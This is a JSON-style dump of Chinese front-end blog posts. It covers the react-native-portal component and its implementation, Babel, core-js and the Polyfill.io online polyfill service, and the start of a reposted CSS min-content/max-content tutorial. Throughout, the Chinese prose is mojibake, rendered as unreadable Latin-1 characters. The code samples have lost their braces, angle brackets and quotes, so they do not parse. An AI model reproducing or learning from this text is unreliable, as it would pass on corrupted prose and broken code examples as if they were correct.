çš„ç¤¾åŒºï¼Œè¿™ç±»å®ç”¨çš„ç»„ä»¶è‡ªç„¶æ—©æ—©å°±æœ‰äº†å¼€æºæ–¹æ¡ˆ - react-native-portal ä¸‹é¢æˆ‘ä»¬çœ‹ä¸‹å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç»„ä»¶ï¼š å®‰è£…è¯¥ç»„ä»¶ ## npmnpm install @gorhom/portal## yarnyarn add @gorhom/portal## pnpmpnpm install @gorhom/portal æ·»åŠ å…¨å±€ context export const App = () = ( PortalProvider ... your app goes here /PortalProvider); ç„¶ååœ¨éœ€è¦çš„åœ°æ–¹ä½¿ç”¨ Portal ç»„ä»¶å³å¯ const BasicScreen = () = return ( ... Portal Text Text to be teleported to the root host /Text /Portal ... );; é‚£ä¹ˆæ‰€æœ‰ä½¿ç”¨ Portal ç»„ä»¶çš„å­å…ƒç´ éƒ½ä¼šè¢«æ’å…¥åˆ° PortalProvider ä¸­ï¼Œå¦‚æœéœ€è¦æ”¹å˜è¢«æ’å…¥çš„ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨ PortalHostè‡ªå®šä¹‰æ’å…¥ä½ç½®ï¼š const CustomView = () = return ( ... PortalHost name=CustomPortalHost / ... );; æ›´å¤šä½¿ç”¨æ–¹æ³•è§å®˜æ–¹æ–‡æ¡£ï¼Œè¿™é‡Œæä¸ªæ–‡ç« æ²¡æœ‰æåˆ°çš„ä½¿ç”¨æŠ€å·§ã€‚Portalç»„ä»¶å¿…é¡»è¦åœ¨ React Component ä¸­ä½¿ç”¨ï¼Œé‚£ä¹ˆä¸€èˆ¬çš„ function ä¸­å¦‚ä½•æ‰èƒ½ä½¿ç”¨ Portalï¼š // 1. é¦–å…ˆåˆ›å»ºä¸ª refï¼Œä½œä¸º portal å®ä¾‹çš„å¼•ç”¨export type PortalService = ReturnTypetypeof usePortal;export const PortalRef = React.createRefPortalService() as MutableRefObjectPortalService;// 2. åœ¨ React Component ä¸­ï¼Œå¼•ç”¨ portal å®ä¾‹const InitializePortalRef = () = const portal = usePortal(); PortalRef.current = portal; return null;;// 3. å°† InitializePortalRef ç»„ä»¶æ”¾ç½®åˆ° PortalProvider ä¸­PortalProvider InitializePortalRef / children/PortalProvider// 4. é€šè¿‡ PortalRef ä½¿ç”¨ portal// æ³¨æ„ï¼šPortalRef åªèƒ½åœ¨ PortalProvider åˆå§‹åŒ–åä½¿ç”¨PortalRef.current?.removePortal(key);PortalRef.current?.updatePortal(key, renderToast());PortalRef.current?.addPortal(key, renderToast()); å®ç° Portal ç»„ä»¶ä¸Šé¢ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨å¼€æºç¤¾åŒºçš„ Portal ç»„ä»¶ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥åˆ†æä¸‹å®ƒæ˜¯å¦‚ä½•å®ç°çš„ï¼Œreact-native-portal ç»„ä»¶çš„ API å¹¶ä¸å¤šï¼Œåªæœ‰ä¸‰ä¸ªç»„ä»¶ Portalï¼ŒPortalHostï¼ŒPortalProvider å’Œä¸€ä¸ªè‡ªå®šä¹‰ hook usePortalã€‚ å…ˆçœ‹ä¸‹ PortalProvider è¿™ä¸ªç»„ä»¶å†…éƒ¨éƒ½åšäº†ä»€ä¹ˆï¼š const PortalProviderComponent = ( rootHostName = root, shouldAddRootHost = true, children,: PortalProviderProps) = const [state, dispatch] = useReducer(reducer, INITIAL_STATE); return ( PortalDispatchContext.Provider value=dispatch PortalStateContext.Provider value=state children shouldAddRootHost PortalHost name=rootHostName / /PortalStateContext.Provider /PortalDispatchContext.Provider );; è¿™ä¸ªç»„ä»¶ä¸­é€šè¿‡ useReducer åˆå§‹åŒ–äº†ä¸¤ä¸ª contextï¼š PortalDispatchContext é‡Œé¢å®šä¹‰äº†ä¸€ç³»åˆ—æ–¹æ³•ï¼ŒåŒ…å« AddUpdatePortalActionï¼ŒRemovePortalAction, RegisterHostActionï¼ŒUnregisterHostActionï¼Œä»åå­—å°±èƒ½çœ‹å‡ºæ¥è¿™äº›æ–¹æ³•æ˜¯åšä»€ä¹ˆçš„ PortalStateContext é‡Œé¢å­˜å‚¨äº†ä¸Šé¢çš„ä¸€ç³»åˆ—æ–¹æ³•æ”¶é›†çš„èŠ‚ç‚¹ é€šè¿‡ useReducer å®šä¹‰çš„ dispatch ä½¿ç”¨èµ·æ¥è¿˜æ˜¯æœ‰äº›ç¹çäº†ï¼Œæ‰€ä»¥é€šè¿‡ usePortal å†å°è£…ä¸‹ import ReactNode, useCallback, useContext from react;import ACTIONS from ../state/constants;import PortalDispatchContext from ../contexts/portal;export const usePortal = (hostName: string = root) = const dispatch = useContext(PortalDispatchContext); if (dispatch === null) throw new Error( PortalDispatchContext cannot be null, please add PortalProvider to the root component. ); //#region methods const registerHost = useCallback(() = dispatch( type: ACTIONS.REGISTER_HOST, hostName: hostName, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); const deregisterHost = useCallback(() = dispatch( type: ACTIONS.DEREGISTER_HOST, hostName: hostName, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); const addUpdatePortal = useCallback((name: string, node: ReactNode) = dispatch( type: ACTIONS.ADD_UPDATE_PORTAL, hostName, portalName: name, node, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); const removePortal = useCallback((name: string) = dispatch( type: ACTIONS.REMOVE_PORTAL, hostName, portalName: name, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); //#endregion return registerHost, deregisterHost, addPortal: addUpdatePortal, updatePortal: addUpdatePortal, removePortal, ;; å‡†å¤‡å·¥ä½œéƒ½å‡†å¤‡å¥½äº†ï¼Œçœ‹ä¸‹å¦‚ä½•æ”¶é›† Portal ä¸­çš„å­èŠ‚ç‚¹ï¼ˆç®€åŒ–äº†ä¸‹æºç ï¼Œåªä¿ç•™å…³é”®çš„åœ°æ–¹ï¼‰ const PortalComponent = ( children, name: _providedName ) = const addPortal: addUpdatePortal, removePortal = usePortal(hostName); const handleOnMountRef = useRefFunction(); const handleOnUnmountRef = useRefFunction(); const handleOnUpdateRef = useRefFunction(); // åœ¨åˆæ¬¡æ¸²æŸ“åé€šè¿‡ addUpdatePortal æ”¶é›† children åˆ° context ä¸­ handleOnMountRef.current = () = addUpdatePortal(name, children); ; // ç»„ä»¶é”€æ¯æ—¶ï¼Œä¹Ÿéœ€è¦ä» context ä¸­é”€æ¯å¯¹åº”çš„ children handleOnUnmountRef.current = () = removePortal(name); ; // children å˜åŠ¨æ—¶ï¼ŒåŒæ­¥åˆ° context ä¸­ handleOnUpdateRef.current = () = addUpdatePortal(name, children); ; useEffect(() = handleOnMountRef.current?.(); return () = handleOnUnmountRef.current?.(); // remove callbacks refs handleOnMountRef.current = undefined; handleOnUnmountRef.current = undefined; handleOnUpdateRef.current = undefined; ; , []); useEffect(() = handleOnUpdateRef.current?.(); , [children]); // è¿”å›ä¸ª nullï¼Œä¸æ¸²æŸ“ children return null;; ç°åœ¨å·²ç»æ”¶é›†åˆ° Portal ä¸­çš„å­å…ƒç´ ï¼Œä¸‹é¢å°±æ˜¯å°†å®ƒä»¬æ¸²æŸ“å‡ºæ¥äº† import React, memo, useEffect from react;import usePortalState from ../../hooks/usePortalState;import usePortal from ../../hooks/usePortal;import type PortalHostProps from ./types;const PortalHostComponent = ( name : PortalHostProps) = //#region hooks const state = usePortalState(name); const registerHost, deregisterHost = usePortal(name); //#endregion //#region effects useEffect(() = registerHost(); return () = deregisterHost(); ; // eslint-disable-next-line react-hooks/exhaustive-deps , []); //#endregion //#region render return state.map((item) = item.node)/; //#endregion;export const PortalHost = memo(PortalHostComponent);PortalHost.displayName = PortalHost; æ¸²æŸ“å°±å¾ˆç®€å•äº†ï¼Œä» context ä¸­å–å‡ºèŠ‚ç‚¹ï¼Œé€šè¿‡ map æ¸²æŸ“å°±å‡ºå°±å®Œäº‹äº†ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒHost æ˜¯æœ‰åˆ†ç»„çš„ï¼Œæ¯ä¸ª Host ç»„ä»¶åªè´Ÿè´£æ¸²æŸ“å®ƒè¿™ä¸ªåˆ†ç»„å†…çš„èŠ‚ç‚¹å³å¯ æ€»ç»“Portal ç»„ä»¶è™½ç„¶å¾ˆåŸºç¡€ï¼Œä½†æ˜¯å´å¹¿æ³›åº”ç”¨åœ¨ Modal ç­‰ç»„ä»¶ä¸­ï¼Œå¯ä»¥è®©æˆ‘ä»¬å…äºæ‰‹åŠ¨ç®¡ç†ç»„ä»¶å±‚çº§é—®é¢˜ï¼ŒåŒæ—¶å…¶è„±ç¦»æ–‡æ¡£æµçš„èƒ½åŠ›æœ‰æ—¶ä¹Ÿä¼šæœ‰äº›å‡ºä¹æ„æ–™çš„åº”ç”¨ã€‚ ä¸Šé¢æåˆ°çš„éƒ½æ˜¯ React ä¸­çš„ Portal ç»„ä»¶ï¼Œé‚£ä¹ˆ Vue ä¸­æœ‰æ²¡æœ‰ç±»ä¼¼çš„ç»„ä»¶å‘¢ï¼Ÿ åœ¨ Vue 3 ä¹‹å‰æ˜¯æ²¡æœ‰çš„ï¼Œéœ€è¦ä½¿ç”¨ç¤¾åŒºæä¾›çš„å¼€æºæ–¹æ¡ˆ - portal-vueã€‚Vue 3 åæœ‰äº†åŸç”Ÿçš„ç»„ä»¶ - Teleportã€‚ æ®Šé€”åŒå½’ï¼Œå¯è§ Portal ä¸å±€é™äºä¸€ä¸ªæ¡†æ¶ï¼Œæ˜¯ä¸ªé€šç”¨çš„è§£å†³æ–¹æ¡ˆã€‚"},{"title":"è¯¦è§£ Polyfill.io","path":"/2023/03/22/4903aabec5c6/","content":"tags: Babel Polyfill categories: Babel Polyfill ä»Šå¤©çœ‹äº†ç¯‡æ–‡ç« ã€Œç”¨äº† babel è¿˜éœ€è¦ polyfill å—ï¼Ÿï¼Ÿï¼Ÿã€ï¼Œæ–‡ç« ä¸­æ˜ç¡®å›ç­”äº†ç”¨äº† babel åè¿˜éœ€è¦ polyfillã€‚babel åªæ˜¯ä¸€ä¸ªå¹³å°ï¼Œæœ¬ç”Ÿä¸æä¾›ä»»ä½•åŠŸèƒ½ï¼Œéœ€è¦å®ç°å„ç§ç‰¹æ€§ï¼Œå¿…é¡»ä¾èµ–å„ç§æ’ä»¶ã€‚å¦‚æœ babel æ²¡æœ‰ä½¿ç”¨ä»»ä½•æ’ä»¶ï¼Œé‚£ä¹ˆä»£ç ç»è¿‡ babel ç¼–è¯‘åä¼šåŸå°ä¸åŠ¨çš„è¿”å›ã€‚ ä»€ä¹ˆæ˜¯ Polyfill ? A polyfill is a piece of code (usually JavaScript on the Web) used to provide modern functionality on older browsers that do not natively support it. polyfill å°±æ˜¯ä¸€æ®µè¡¥ä¸ä»£ç ï¼Œå®ƒèƒ½å¤Ÿè®©å½“å‰æµè§ˆå™¨ä¸æ”¯æŒçš„æ–¹æ³•é€šè¿‡ç”¨æ”¯æŒçš„æ–¹æ³•é‡å†™æ¥è·å¾—æ”¯æŒã€‚ æ¯”å¦‚ IE11 ä¸æ”¯æŒ Promiseï¼Œè€Œæˆ‘ä»¬åˆéœ€è¦åœ¨é¡¹ç›®é‡Œç”¨åˆ°ï¼Œå†™äº†è¿™æ ·çš„ä»£ç ï¼š script Promise.resolve(bar).then(function (foo) document.write(foo); );/script è¿™æ—¶åœ¨ IE ä¸‹è¿è¡Œå°±ä¼šæŠ¥é”™äº† ç„¶ååœ¨æ­¤ä¹‹å‰åŠ ä¸Šè¡¥ä¸ script src=https://cdn.jsdelivr.net/npm/promise-polyfill@8/dist/polyfill.min.js/scriptscript Promise.resolve(bar).then(function (foo) document.write(foo); );/script åˆ·æ–°æµè§ˆå™¨ï¼Œå°±å¯ä»¥æ­£å¸¸è¿è¡Œäº† Polyfill æ–¹æ¡ˆcore-js @babelpolyfill Core-js æ˜¯ JavaScript æ ‡å‡†åº“ä¸­æœ€æµè¡Œä¹Ÿæœ€å¸¸ç”¨çš„ polyfillï¼Œä¸ºæœ€æ–°çš„ ECMAScript æ ‡å‡†å’Œææ¡ˆæä¾›æ”¯æŒï¼ŒåŒ…æ‹¬å¤è€çš„ ES5 åŠŸèƒ½åˆ°è¿­ä»£å™¨åŠ©æ‰‹ç­‰å‰æ²¿é€‰é¡¹ï¼› [@babel/polyfill](https://babeljs.io/docs/en/next/babel-polyfill.html) è¿™æ˜¯ core-jsçš„ä¸€ä¸ªåŒ…è£…å™¨ï¼Œå¼•å…¥çš„æ˜¯ core-js çš„ stable ç‰¹æ€§ï¼Œå› æ­¤ä» Babel 7.4.0 ä¹‹åï¼Œè¿™ä¸ªåŒ…å°±ä¸å†ç»´æŠ¤äº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ç›´æ¥å¼•ç”¨ font style=color:rgb(68, 73, 80);core-js/stable/fontï¼š Babel 7.4.0 ä¹‹å‰ï¼š import @babel/polyfill; Babel 7.4.0 ä¹‹åæ”¹ä¸ºï¼š import core-js/stable;import regenerator-runtime/runtime; å› ä¸º core-js ä¸­ JavaScript æ ‡å‡†åº“çš„ä¸€ä¸ª polyfillï¼Œä¸ä»…æ”¯æŒæœ€æ–°çš„ ECMAScript æ ‡å‡†ï¼Œè€Œä¸”è¿æ ‡å‡†åº“ææ¡ˆéƒ½åŒ…å«åœ¨å†…ï¼Œå› æ­¤å¼•å…¥è¿™ä¸€ä¸ªåº“ï¼Œes6ï¼Œes7 ç­‰æ–°ç‰¹æ€§å°±å¯ä»¥éšä¾¿å†™äº†ï¼Œä¸ç„¶æ‹…å¿ƒå…¼å®¹æ€§é—®é¢˜ã€‚ ä½†æ˜¯ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¹Ÿå¸¦æ¥ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹ï¼Œä¸ç®¡ä½ æµè§ˆå™¨æ˜¯å¦æ”¯æŒï¼Œä¹Ÿä¸ç®¡ä½ é¡¹ç›®æ˜¯å¦æœ‰ç”¨åˆ°ï¼Œéƒ½å…¨é‡å¼•å…¥äº†ï¼Œè¿™åœ¨ä¸€äº›æ€§èƒ½å’Œå¸¦å®½ä¸¥è‹›çš„ç¯å¢ƒä¸‹ä¼šå¸¦æ¥å¾ˆå¤§çš„éº»çƒ¦ã€‚ @babelpreset-env @babelpreset-env æ˜¯ babel çš„ä¸€ç»„é¢„è®¾ï¼Œå…¶ä¸­å°±æœ‰ pollyfill çš„ç›¸å…³é…ç½® @babelpreset-env æœ‰ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡ font style=color:rgb(36, 41, 47);useBuiltIns/fonté€‰é¡¹å¯ç”¨ï¼Œå…¶æœ‰ä¸‰ä¸ªå‚æ•°ï¼š entry usage false å…¶ä¸­ï¼Œentryå’Œ usageéƒ½å¯ä»¥ä¼˜åŒ– core-js çš„å¼•ç”¨ï¼Œå…¶åŒºåˆ«åœ¨äºï¼š useBuiltIns: entryä½¿ç”¨è¯¥é€‰é¡¹ï¼Œfont style=color:rgb(36, 41, 47);@babel/preset-env/fontå°†æ‰¾åˆ°å…¥å£æ–‡ä»¶é‡Œå¼•å…¥çš„ core-jsï¼Œå¹¶æ›¿æ¢ä¸º targets æµè§ˆå™¨ç¯å¢ƒéœ€è¦çš„è¡¥ä¸åˆ—è¡¨ .babelrc é…ç½®å¦‚ä¸‹ï¼š presets: [ [@babel/env, useBuiltIns: entry, targets: chrome: 72 ] ] å…¥å£æ–‡ä»¶å¼•å…¥ core-jsï¼š import core-js/stable;import regenerator-runtime/runtime; è½¬æ¢ç›®æ ‡æ˜¯ chrome 72 æ—¶ï¼Œå°†è¢«è½¬åŒ–ä¸ºï¼š import core-js/modules/es.array.unscopables.flat;import core-js/modules/es.array.unscopables.flat-map;import core-js/modules/es.object.from-entries;import core-js/modules/web.immediate; å¦‚æœè½¬åŒ–ç›®æ ‡æ˜¯ chrome 73ï¼ˆå®Œå…¨æ”¯æŒ ES2019 æ ‡å‡†åº“ï¼‰ï¼Œå°†å¾—åˆ°ä¸ªæ›´ç®€çŸ­çš„å¼•å…¥ï¼š import core-js/modules/web.immediate; useBuiltIns: usageå½“å¯ç”¨è¿™ä¸ªé€‰é¡¹æ—¶ï¼Œfont style=color:rgb(36, 41, 47);@babel/preset-env/fontåªä¼šåœ¨æ¯ä¸ªæ–‡ä»¶é¡¶éƒ¨æ·»åŠ ä»…ç”¨äºå½“å‰ä½¿ç”¨çš„ã€ç›®æ ‡ç¯å¢ƒä¸æ”¯æŒçš„åŠŸèƒ½çš„ polyfills ä¾‹å¦‚ï¼š const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); å½“è½¬åŒ–ç›®æ ‡æ˜¯è€æ—§çš„ä½ç‰ˆæœ¬æµè§ˆå™¨ï¼Œæ¯”å¦‚ ie 11ï¼Œä¸Šé¢çš„ä»£ç å°†è¢«è½¬åŒ–ä¸ºï¼š import core-js/modules/es.array.includes;import core-js/modules/es.array.iterator;import core-js/modules/es.object.to-string;import core-js/modules/es.set;const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); å½“ç›®æ ‡æ˜¯ chrome 72æ—¶ï¼Œä¸ä¼šå¯¼å…¥ä»»ä½• polyfillsï¼Œå› ä¸ºç›®æ ‡ç¯å¢ƒä¸éœ€è¦è¿™äº› polyfillsï¼š const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); ä¸Šé¢ä¸ç®¡æ˜¯ font style=color:rgb(36, 41, 47);entry/fontè¿˜æ˜¯ font style=color:rgb(36, 41, 47);usage/fontéƒ½èƒ½å¤Ÿå®ç° polyfill ä¸€å®šçš„æŒ‰éœ€å¼•å…¥ï¼Œå¥½æ˜¯å¥½ï¼Œä½†æ˜¯ä»”ç»†æƒ³æƒ³ï¼Œè¿˜æ˜¯æœ‰ä¸å°‘é—®é¢˜çš„ï¼š ç‰¹æ€§åˆ—è¡¨æ˜¯æŒ‰æµè§ˆå™¨æ•´ç†çš„ï¼Œé‚£æ€ä¹ˆçŸ¥é“å“ªäº›ç‰¹æ€§æˆ‘ç”¨äº†ï¼Œå“ªäº›æ²¡æœ‰ç”¨åˆ°ï¼Œæ²¡æœ‰ç”¨åˆ°çš„éƒ¨åˆ†ä¹Ÿå¼•å…¥äº†æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯å†—ä½™ï¼Ÿ è¡¥ä¸æ˜¯æ‰“åŒ…åˆ°é™æ€æ–‡ä»¶çš„ï¼Œå¦‚æœæˆ‘é…ç½® targets ä¸º chrome: 62, ie: 9ï¼Œé‚£æ„å‘³ç€ chrome 62 ä¹Ÿå¾—è½½å…¥ ie 9 ç›¸å…³çš„è¡¥ä¸ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä»½å†—ä½™ æˆ‘ä»¬æ˜¯åŸºäº core-js æ‰“çš„è¡¥ä¸ï¼Œæ‰€ä»¥åªä¼šåŒ…å« ecmascript è§„èŒƒé‡Œçš„å†…å®¹ï¼Œå…¶ä»–æ¯”å¦‚è¯´ dom é‡Œçš„è¡¥ä¸ï¼Œå°±ä¸åœ¨æ­¤åˆ—ï¼Œåº”è¯¥å¦‚ä½•å¤„ç†ï¼Ÿ æ‰‹åŠ¨å¼•å…¥å‰é¢çš„æ–¹æ¡ˆéƒ½æ˜¯åŸºäº babel ç¼–è¯‘å™¨çš„æ–¹æ¡ˆï¼Œè™½ç„¶ä½æ•ˆä½†æ˜¯ç›´è§‚æœ‰ç”¨ã€‚å¦‚æœæ˜¯åœ¨ä¸€äº›ç‰¹åˆ«åœ¨ä¹æ€§èƒ½çš„åœºæ™¯ï¼Œæ¯”å¦‚ H5 è¥é”€é¡µé¢ï¼Œå®å¯ç‰ºç‰²æ•ˆç‡ä¹Ÿè¦æœ€æ±‚æ€§èƒ½ã€‚é‚£ä¹ˆå¯ä»¥æ‰‹åŠ¨å¼•å…¥ core-jsmodules ä¸‹çš„æ–‡ä»¶ï¼Œç¼ºå•¥åŠ å•¥å°±å¥½ã€‚ åœ¨çº¿è¡¥ä¸ä¸Šé¢å•°å—¦äº†ä¸€å¤§å †ï¼Œå’Œæœ¬æ–‡çš„ä¸»é¢˜ Polyfill.io æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿå‰é¢éƒ½æ˜¯ä¸ºäº†è§£å†³å¦‚ä½•å¼•å…¥ç‰¹æ€§åˆ—è¡¨çš„é—®é¢˜ï¼Œæœ‰äº†ç‰¹æ€§åˆ—è¡¨ï¼Œè¦åšåˆ°æŒ‰éœ€ä¸‹è½½ï¼Œå°±éœ€è¦ç”¨åˆ°åœ¨çº¿è¡¥ä¸çš„æœåŠ¡äº†ã€‚è¿™å°±åˆ°äº†æœ¬æ–‡çš„ä¸»é¢˜ï¼Œpolyfill.io - ç›®å‰æœ€æµè¡Œçš„åœ¨çº¿è¡¥ä¸æœåŠ¡ã€‚ ä½ å¯ä»¥å°è¯•åœ¨ä¸åŒçš„æµè§ˆå™¨ä¸‹è®¿é—® https://polyfill.io/v3/polyfill.min.js è¿™ä¸ªæ–‡ä»¶ï¼ŒPolyfill.io æœåŠ¡ç«¯ä¼šæ ¹æ®ç”¨æˆ·è®¿é—®æºå¸¦çš„æµè§ˆå™¨ UA è¿”å›ä¸åŒçš„ pollfill æ–‡ä»¶ï¼ŒçœŸæ­£åšåˆ°äº†æŒ‰éœ€åŠ è½½ã€‚ä½ éœ€è¦åšçš„ä»…ä»…æ˜¯åœ¨é¡µé¢ä¸Šå¼•å…¥è¿™ä¸ªæ–‡ä»¶ï¼š script src=https://polyfill.io/v3/polyfill.min.js/script ç„¶ååœ¨ Chromeï¼ˆä½œè€…ç”¨çš„ Chrome æ˜¯ 111 ç‰ˆæœ¬ï¼‰ä¸‹çš„è¾“å‡ºæ˜¯ï¼š /* Polyfill service v3.111.0 * Disable minification (remove `.min` from URL path) for more info */ å•¥éƒ½æ²¡æœ‰ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬çš„ Chrome å·²ç»å®Œæ•´æ”¯æŒäº† ECMAScript æ ‡å‡†å’Œææ¡ˆçš„æ‰€æœ‰ç‰¹æ€§ï¼Œæ²¡å•¥éœ€è¦ pollyfill çš„ã€‚ Polyfill.io ä¸ä»…æä¾›äº† CDN æœåŠ¡ï¼Œè¿˜å¼€æºäº† polyfill-service ä¾›æˆ‘ä»¬è‡ªå·±æ­å»ºä½¿ç”¨ã€‚é’ˆå¯¹å›½å†…è®¿é—® Polyfill.io è¾ƒæ…¢çš„é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨é˜¿é‡Œäº‘çš„ polyfill æœåŠ¡æ›¿æ¢ https://polyfill.alicdn.com/polyfill.min.js é˜¿é‡Œäº‘ä¸ä»…ä»…æ˜¯ Polyfill.ioï¼Œå®ƒè¿˜åšäº†ä¸€äº›ä¼˜åŒ–ï¼Œåœ¨ä½œè€…çš„ chrome ä¸Šè®¿é—®ä¸Šé¢çš„é“¾æ¥ï¼š ä¼šåŠ è½½ä¸€äº›é¢å¤–çš„ä»£ç ï¼Œè¿™è¡¨ç°å’Œ Polyfill.io ä¸ä¸€æ ·ï¼Œå› æ­¤ä¸èƒ½ç®€å•çš„æŠŠé˜¿é‡Œäº‘çš„ polyfill å½“æˆ Polyfill.io çš„å¹³æ›¿ï¼Œè‡³äºé˜¿é‡Œäº‘åšäº†å“ªäº›ä¼˜åŒ–ï¼Œæœ¬æ–‡å°±ä¸å†è®¨è®ºäº†ï¼Œæœ‰æœºä¼šå¦å¼€æ–‡ç« ä»‹ç»ã€‚ å½“ç„¶æ”¹æ–¹æ¡ˆä¹Ÿä¸æ˜¯å®Œç¾çš„ï¼Œæœ€èµ·ç å®ƒæœ‰ä»¥ä¸‹ä¸¤ä¸ªç¼ºç‚¹ï¼š å¤šäº†ä¸€æ¬¡ http è¯·æ±‚ é’ˆå¯¹å›½å†…ä¹±ä¸ƒå…«ç³Ÿçš„æµè§ˆå™¨æ˜¯å¦èƒ½å¤Ÿå‡†ç¡®è¯†åˆ«ä»è€Œè¿”å›éœ€è¦çš„ polyfill ä»£ç å°±ä¸å¾—è€ŒçŸ¥äº† å®Œæ•´ Pollyfill æ–¹æ¡ˆæœ¬æ–‡å…³äº Polyfill æ–¹æ¡ˆçš„ä»‹ç»å¤§éƒ¨åˆ†éƒ½æ˜¯æ¥è‡ªå¤§ä½¬ä»¬çš„æ–‡ç« ï¼ŒåŒæ—¶ä¹ŸåŒ…å«äº†ä¸€äº›è‡ªå·±çš„æ€è€ƒã€‚æ˜¯æ—¶å€™æ¥ä¸ªæ€»ç»“ï¼Œå…³äº Pollyfill æˆ‘è®¤ä¸º æŒ‰éœ€ç‰¹æ€§æ¢æµ‹ + åœ¨çº¿è¡¥ä¸ æ‰æ˜¯ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„æ–¹æ¡ˆï¼š æŒ‰éœ€ç‰¹æ€§æ¢æµ‹å¯ä»¥ä½¿ç”¨ font style=color:rgb(36, 41, 47);@babel/preset-env/fonté…ä¸Š font style=color:rgb(36, 41, 47);targets/fontä»¥åŠ font style=color:rgb(36, 41, 47);useBuiltIns: usage/fontï¼Œå¯ä»¥ä¿éšœç‰¹æ€§é›†çš„æœ€å°åŒ–ã€‚ åœ¨çº¿è¡¥ä¸å¯ä»¥ä½¿ç”¨ Polyfill.io çš„æ–¹æ¡ˆï¼ˆå¤§å…¬å¸å¯ä»¥ä½¿ç”¨è‡ªå·±æ­å»ºçš„æœåŠ¡ï¼‰ï¼Œå¯ä»¥ä¿éšœé‡åˆ°ç›®æ ‡æµè§ˆå™¨ä¸æ”¯æŒçš„ç‰¹æ€§æ˜¯èƒ½åšåˆ°æŒ‰éœ€åŠ è½½ï¼Œç»™ä¸šåŠ¡å†åšä¸€å±‚å…œåº•ã€‚ å‚è€ƒ https://juejin.cn/post/6845166891015602190#heading-2 https://github.com/sorrycc/blog/issues/80 https://github.com/zloirock/core-js/blob/master/docs/2019-03-19-core-js-3-babel-and-a-look-into-the-future.md"},{"title":"ã€è½¬è½½ã€‘CSS å†…åœ¨å°ºå¯¸æ•™ç¨‹ï¼ˆmin-contentã€max-content å’Œ fit-content ï¼‰","path":"/2023/03/02/23c511e540c1/","content":"åŸæ–‡é“¾æ¥ï¼šIntrinsic Sizing In CSSï¼Œby Ahmad Shadeed CSS ä¸­å­˜åœ¨ä¸¤ç§å°ºå¯¸ï¼šå†…åœ¨å°ºå¯¸ï¼ˆintrinsicï¼‰å’Œå¤–åœ¨å°ºå¯¸ï¼ˆextrinsicï¼‰ã€‚ä¸ºå…ƒç´ çš„ widthã€height è®¾ç½®çš„å›ºå®šå±æ€§å€¼ï¼Œå°±æ˜¯æŒ‡å¤–éƒ¨å°ºå¯¸ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ã€‚è€Œå†…éƒ¨å°ºå¯¸ï¼Œåˆ™æ˜¯ç”±å…ƒç´ åŒ…å«çš„å†…å®¹é‡å†³å®šçš„ã€‚ æœ¬ç¯‡å°†ä¼šè¯¦ç»†ä»‹ç»æ§åˆ¶å†…åœ¨å°ºå¯¸çš„æ¯ä¸ªå€¼ï¼Œçœ‹çœ‹å®ƒä»¬çš„ä½¿ç”¨èƒ½å¸¦æ¥ä»€ä¹ˆå¥½å¤„ã€‚åŒæ—¶ï¼Œæˆ‘è¿˜ä¼šä¸¾ä¾‹è¯´æ˜è¿™äº›å€¼ä¸ CSS Grid å¸ƒå±€å…¶ä»–å±æ€§å¦‚ä½•ç»“åˆä½¿ç”¨ã€‚ å¤–åœ¨å°ºå¯¸å¤–åœ¨å°ºå¯¸æ˜¯æŒ‡ç”¨ç²¾ç¡®çš„å€¼æŒ‡å®šå…ƒç´ å°ºå¯¸ã€‚ä¸¾ä¸ªä¾‹å­ï¼š è¿™ä¸ªæŒ‰é’®çš„å°ºå¯¸æ˜¯ 100pxï¼Œè¿™å°±æ˜¯å¤–åœ¨å°ºå¯¸äº†ã€‚å†æ¯”å¦‚ä¸€ä¸ª div å…ƒç´ ï¼Œå®ƒé»˜è®¤æ˜¯ä¸ªå—çº§å…ƒç´ ï¼Œå°±æ˜¯è¯´å®ƒçš„å®½é»˜è®¤ç­‰äº 100% çˆ¶å…ƒç´ çš„å®½ã€‚ æœ‰æ—¶ï¼Œæˆ‘ä»¬æƒ³è¦æ ¹æ®å…ƒç´ å®é™…çš„å†…å®¹æ¥è®¾ç½®å°ºå¯¸ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä½¿ç”¨å¤–åœ¨å°ºå¯¸å°±æ²¡æœ‰ç”¨äº†ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•æ˜¯ç”¨å†…åœ¨å±æ€§å€¼æ¥è§£å†³é—®é¢˜çš„å§ï¼ min-contentmin-content å€¼è¡¨ç¤ºå†…åœ¨æœ€å°å®½åº¦ï¼ˆè¯‘æ³¨ï¼šè¿™é‡Œè¯´çš„ä¸å‡†ç¡®ï¼Œä¹Ÿå¯ä»¥æ˜¯â€œæœ€å°é«˜åº¦â€ï¼Œå› æ­¤åº”è¯¥ç§°ä¸ºâ€œæœ€å°å°ºå¯¸â€ï¼‰ï¼Œå®ƒç­‰äºå…ƒç´ å†…å®¹é‡Œæœ€é•¿çš„é‚£ä¸ªå•è¯å®½åº¦ã€‚ CSS Working Group (CSSWG) çš„è¯´æ³•æ˜¯ï¼š The inline size that would fit around its contents if all soft wrap opportunities within the box were taken. å¦ç‡åœ°è®²ï¼Œæˆ‘å¤ªç†è§£ CSSWG 